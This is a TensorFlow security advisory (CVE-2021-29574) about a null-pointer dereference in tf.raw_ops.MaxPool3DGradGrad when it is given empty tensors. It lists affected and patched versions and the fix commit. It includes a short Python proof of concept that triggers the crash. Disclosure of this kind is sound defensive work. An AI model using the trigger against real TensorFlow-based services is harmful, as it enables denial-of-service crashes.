# Undefined behavior in `MaxPool3DGradGrad`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-828x-qc2p-wprq
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

The implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:

```
import tensorflow as tf

orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.MaxPool3DGradGrad(
    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
    strides=strides, padding=padding)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.

### Patches

We have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.

### Severity

Low

### CVE ID

CVE-2021-29574

### Weaknesses

No CWEs
